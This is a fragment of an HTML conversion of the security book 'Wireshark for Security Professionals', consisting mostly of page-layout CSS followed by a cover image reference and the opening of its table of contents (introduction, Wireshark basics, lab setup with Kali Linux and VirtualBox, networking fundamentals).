margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section294{page:Section294;}@page Section295{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section295{page:Section295;}@page Section296{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section296{page:Section296;}@page Section297{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section297{page:Section297;}@page Section298{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section298{page:Section298;}@page Section299{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section299{page:Section299;}@page Section300{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section300{page:Section300;}@page Section301{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section301{page:Section301;}@page Section302{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section302{page:Section302;}@page Section303{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section303{page:Section303;}@page Section304{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section304{page:Section304;}@page Section305{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section305{page:Section305;}@page Section306{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section306{page:Section306;}@page Section307{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section307{page:Section307;}@page Section308{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section308{page:Section308;}@page Section309{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section309{page:Section309;}@page Section310{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section310{page:Section310;}@page Section311{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section311{page:Section311;}@page Section312{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section312{page:Section312;}@page Section313{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section313{page:Section313;}@page Section314{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section314{page:Section314;}@page Section315{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section315{page:Section315;}@page Section316{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section316{page:Section316;}@page Section317{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section317{page:Section317;}@page Section318{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section318{page:Section318;}@page Section319{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section319{page:Section319;}@page Section320{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section320{page:Section320;}@page Section321{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section321{page:Section321;}@page Section322{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section322{page:Section322;}@page Section323{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section323{page:Section323;}@page Section324{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section324{page:Section324;}@page Section325{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section325{page:Section325;}@page Section326{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section326{page:Section326;}@page Section327{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section327{page:Section327;}@page Section328{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section328{page:Section328;}@page Section329{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section329{page:Section329;}@page Section330{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section330{page:Section330;}@page Section331{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section331{page:Section331;}@page Section332{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section332{page:Section332;}@page Section333{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section333{page:Section333;}@page Section334{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section334{page:Section334;}@page Section335{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section335{page:Section335;}@page Section336{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section336{page:Section336;}@page Section337{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section337{page:Section337;}@page Section338{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section338{page:Section338;}@page Section339{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section339{page:Section339;}@page Section340{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section340{page:Section340;}@page Section341{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section341{page:Section341;}@page Section342{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section342{page:Section342;}@page Section343{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section343{page:Section343;}@page Section344{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section344{page:Section344;}@page Section345{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section345{page:Section345;}@page Section346{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section346{page:Section346;}@page Section347{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section347{page:Section347;}@page Section348{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section348{page:Section348;}@page Section349{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section349{page:Section349;}@page Section350{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section350{page:Section350;}@page Section351{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section351{page:Section351;}@page Section352{
margin-top:72.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section352{page:Section352;}@page Section353{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section353{page:Section353;}@page Section354{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section354{page:Section354;}@page Section355{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section355{page:Section355;}@page Section356{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section356{page:Section356;}@page Section357{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section357{page:Section357;}@page Section358{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section358{page:Section358;}@page Section359{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section359{page:Section359;}@page Section360{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section360{page:Section360;}@page Section361{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section361{page:Section361;}@page Section362{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section362{page:Section362;}@page Section363{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section363{page:Section363;}@page Section364{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section364{page:Section364;}@page Section365{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section365{page:Section365;}@page Section366{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section366{page:Section366;}@page Section367{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section367{page:Section367;}@page Section368{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section368{page:Section368;}@page Section369{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section369{page:Section369;}@page Section370{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section370{page:Section370;}@page Section371{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section371{page:Section371;}@page Section372{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section372{page:Section372;}@page Section373{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section373{page:Section373;}@page Section374{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section374{page:Section374;}@page Section375{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section375{page:Section375;}@page Section376{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section376{page:Section376;}@page Section377{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section377{page:Section377;}@page Section378{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section378{page:Section378;}@page Section379{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section379{page:Section379;}@page Section380{
margin-top:74.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section380{page:Section380;}@page Section381{
margin-top:69.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section381{page:Section381;}@page Section382{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section382{page:Section382;}@page Section383{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section383{page:Section383;}@page Section384{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section384{page:Section384;}@page Section385{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section385{page:Section385;}@page Section386{
margin-top:68.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section386{page:Section386;}@page Section387{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section387{page:Section387;}@page Section388{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section388{page:Section388;}@page Section389{
margin-top:75.0000pt;
margin-bottom:14.0000pt;
margin-left:64.0000pt;
margin-right:64.0000pt;
size:612.0000pt 792.0000pt;
}
div.Section389{page:Section389;}</style></head><body style="tab-interval:36pt;" ><!--StartFragment--><div class="Section0" ><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span style="position:absolute;z-index:-1;margin-left:0.0000px;margin-top:0.0000px;width:1020.0000px;height:1320.0000px;" ><img width="1020"  height="1320"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker0.png" ></span><span style="mso-spacerun:'yes';font-family:'Times New Roman';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:8.5000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Times New Roman';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section1" ><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Times New Roman';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Times New Roman';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><h1 style="margin-top:4.4500pt;" ><a name="_bookmark0" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" >Table of Contents</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><o:p></o:p></span></b></h1><p class=MsoBodyText  style="margin-top:5.0500pt;margin-right:386.8500pt;margin-left:30.5000pt;line-height:127%;" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Cover</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark1" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Title Page</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:30.5000pt;line-height:16.9000pt;mso-line-height-rule:exactly;" ><span><a href="#_bookmark2" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Introduction</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:5.4500pt;margin-right:178.7000pt;margin-left:53.0000pt;line-height:127%;" ><span><a href="#_bookmark4" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Overview of the Book and Technology</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark6" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >How This Book Is Organized</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-right:240.4500pt;margin-left:53.0000pt;line-height:127%;" ><span><a href="#_bookmark8" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Who Should Read This Book</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark10" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Tools You Will Need</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-right:281.4500pt;margin-left:53.0000pt;line-height:127%;" ><span><a href="#_bookmark11" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >What&#8217;s on the Website</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark12" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Summary</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-right:229.0000pt;margin-left:53.0000pt;text-indent:-22.5000pt;line-height:127%;" ><span><a href="#_bookmark13" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 1: Introducing Wireshark</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark15" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >What Is Wireshark?</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-right:233.5000pt;margin-left:53.0000pt;line-height:127%;" ><span><a href="#_bookmark18" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >The Wireshark User Interface</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark30" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Filters</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-right:365.4000pt;margin-left:53.0000pt;line-height:127%;" ><span><a href="#_bookmark52" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Summary</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark54" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Exercises</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-right:240.4500pt;margin-left:53.0000pt;text-indent:-22.5000pt;line-height:127%;" ><span><a href="#_bookmark55" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 2: Setting Up the Lab</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark59" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Kali Linux</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-right:332.7500pt;margin-left:53.0000pt;line-height:128%;" ><span><a href="#_bookmark62" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Virtualization</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark65" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >VirtualBox</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark166" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >The W4SP </span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-0.3000pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Lab</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-0.3000pt;font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark194" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Summary</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark195" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Exercises</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-right:178.7000pt;margin-left:53.0000pt;text-indent:-22.5000pt;line-height:131%;" ><span><a href="#_bookmark197" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 3: The Fundamentals</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark200" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Networking</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:53.0000pt;line-height:16.3000pt;mso-line-height-rule:exactly;" ><span><a href="#_bookmark210" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Security</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:4.1500pt;margin-left:53.0000pt;" ><span><a href="#_bookmark217" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Packet and Protocol Analysis</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
